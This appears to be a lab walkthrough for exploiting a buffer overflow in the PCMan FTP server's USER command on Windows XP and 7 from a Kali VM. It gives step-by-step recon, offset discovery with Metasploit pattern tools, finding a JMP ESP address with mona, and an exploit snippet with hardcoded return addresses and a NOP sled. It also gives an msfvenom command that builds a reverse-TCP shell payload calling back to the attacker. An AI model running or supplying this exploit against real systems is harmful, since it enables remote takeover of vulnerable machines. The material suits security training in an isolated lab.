Start All the VMs kali, win7/winXP
ON KALI
#arp-scan –local 	 //Command to know all the machines availble in the network.
Once you have ip address of the target machine do nmap to get the OS information and service running on the machine with following command:
#nmap -O -sV <ip of the target machine>

Simulation part------ (Victim Machine)
	Start PCman application on windows (xp or 7)
	Launch the Debugger
	Observe the register values
ON KALI
	Prepare with the exploit code
	Make proper changes as per your environment (change ip/port of target if hardcoded In the code)
	Exploit Code:
		First try to find out the offset (size of the buffer)
			To do this we can use Fuzzers or msf pattern command
			msf pattern command:
			#msf-pattern_create  -l  <length of pattern>
			#msf-pattern_offset  -l  <pattern found in EIP>
Or go to this directory   /usr/share/metasploit-framework/tools/exploit/
pattern_create.rb  	//To get the pattern
pattern_offset.rb	//To get the offset
Once we have the offset values now we will find the address of the JMP ESP Command of the vulnerable application running on the victim machine.
Finding address of JMP ESP
On simulation machine (xp/7) – Configure mona master with the debugeer
Download the mona master python script and put the script in python commands folder in debuggers installation folder.
Now run the following command to get the address of JMP ESP;
!mona find  -s ‘\xff\xe4’   //where ffe4 is the hexa code of JMP ESP instruction.
Note down the address(first one in the list preferably)
Convert it into littleindian format
In exploit code
    Cmd = "USER" #Vulnerable command
    JuNk = '\x42' * 2001
    #ret = '\xcb\x01\xf4\x76'  #Windows XP
    ret = '\xDC\x4B\xF7\x76' #Windows 7
    NOP = "\x90" * 1000
 	  sploit = Cmd + JuNk + ret + NOP + payload

To create payload:
msfvenom  -p windows/shell/reverse_tcp LHOST=<AttackerIP> LPORT <portno>  -n 10 –f python –v payload lport <port> --plateform windows –arch x86 –b \x00\01\02\0a\0d

copy the generated payload in the exploit code
save and run the exploit code.
That’s it.

			




